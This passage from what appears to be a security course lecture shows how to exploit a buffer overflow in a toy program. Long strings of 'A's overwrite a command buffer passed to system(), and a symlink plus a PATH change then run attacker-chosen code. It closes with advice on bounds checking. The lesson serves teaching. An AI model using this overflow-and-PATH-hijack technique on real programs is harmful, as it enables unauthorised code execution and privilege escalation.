@@ -1,0 +1,34 @@
+Consider what happens when we increase the size of the input selection. To do this programatically, I'm going to use a small trick of the python programming language to print a bunch of 'A's.
+
+$ python -c "print 'A'*10"
+AAAAAAAAAA
+$ python -c "print 'A'*20"
+AAAAAAAAAAAAAAAAAAAA
+$ python -c "print 'A'*30"
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$ python -c "print 'A'*40"
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$ python -c "print 'A'*50"
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+I'm using this to produce strings of varying length, length 10, 20, 30, 40, and 50. Those strings can be sent to the target program using a pipe. 
+
+python -c "print 'A'*10" | ./overflow_system
+
+Something changes at when the input string is 50 bytes long. We overflow the buffer for the input. Recall that the input buffer is only 40 bytes and size, and it is placed adjacent to the cmd buffer:
+
+char cmd[1024] = "/bin/cat ./"; //will append to this string
+
+char input[40];
+
+When the input buffer overflows, we begin to write 'A's to cmd which replaces "/bin/cat". Finally, we concatenate cmd with input, resulting in a long string of 'A's for the command being executed by system(). We can see this from the error output
+
+How do we leverage this error to pwn this program? The program is trying to execute a command that is "AAA…" and we can control the PATH. Let's create such a program named "AAA…" Rather than writing a new program, we can use sym-linking.
+
+ln -s cat AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+aviv@saddleback: demo $ ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+Goodbye World
+
+export PATH=.:$PATH
+
+How do we fix overflow bugs? The most direct way is to always bound checks on strings. For example, always use strncp() or strncat(), but that is even sometimes not sufficient. In the end, it requires good programmers who understand security and can identify bad programming practices. This is just a small set of examples of bad programs.
